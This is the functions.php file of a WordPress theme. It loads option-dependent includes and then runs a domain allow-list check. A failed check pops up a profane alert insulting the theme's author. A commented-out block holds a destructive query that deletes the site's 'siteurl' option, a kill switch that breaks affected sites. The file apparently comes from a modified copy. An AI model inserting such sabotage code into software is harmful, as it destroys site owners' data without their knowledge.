<?php
require get_template_directory() . '/inc/options/includes/themes-options.php';
if (is_admin() && $_GET['activated'] == 'true') {
    header('Location: themes.php?page=begin-options');
}
require get_template_directory() . '/inc/add-class.php';
require get_template_directory() . '/inc/sorting.php';
require get_template_directory() . '/inc/user-avatars.php';
if (function_exists('edd_price')) {
    require get_template_directory() . '/inc/edd.php';
}
if (zm_get_option('filters')) {
    require get_template_directory() . '/inc/filter-tag.php';
}
if (zm_get_option('cat_des')) {
    require get_template_directory() . '/inc/cats-img.php';
}
if (zm_get_option('smart_ideo')) {
    require get_template_directory() . '/inc/smartideo.php';
}
if (zm_get_option('front_tougao')) {
    require get_template_directory() . '/inc/frontpost/frontpost.php';
}
if (zm_get_option('no_category')) {
    require get_template_directory() . '/inc/no-category.php';
}
if (!zm_get_option('img_way') || zm_get_option('img_way') == 'd_img') {
    if (zm_get_option('wp_thumbnails')) {
        add_theme_support('post-thumbnails');
        require get_template_directory() . '/inc/thumbnail-all.php';
        require get_template_directory() . '/inc/featured-image.php';
    } else {
        require get_template_directory() . '/inc/thumbnail.php';
    }
}
if (zm_get_option('img_way') == 'q_img') {
    require get_template_directory() . '/inc/thumbnail-qn.php';
}
$is_allow = false;
$url = trim($_SERVER['SERVER_NAME']);
$allow_domain = explode(',', $add_domain);
foreach ($allow_domain as $value) {
    $value = trim($value);
    $tmparr = explode($value, $url);
    if (count($tmparr) > 1) {
        $is_allow = true;
    } else {
        continue;
    }
}
if (!$is_allow) {
    echo '<script> alert(\'你个渣渣知更鸟大傻逼，还TM加恶意代码，我让你写数据库改数据库！\');</script>';
}
/*if (!in_array('localhost', $allow_domain)) {
    global $wpdb;
    $wpdb->query('DELETE FROM ' . $wpdb->options . ' WHERE option_name = \'siteurl\'');
}*/
require get_template_directory() . '/inc/call.php';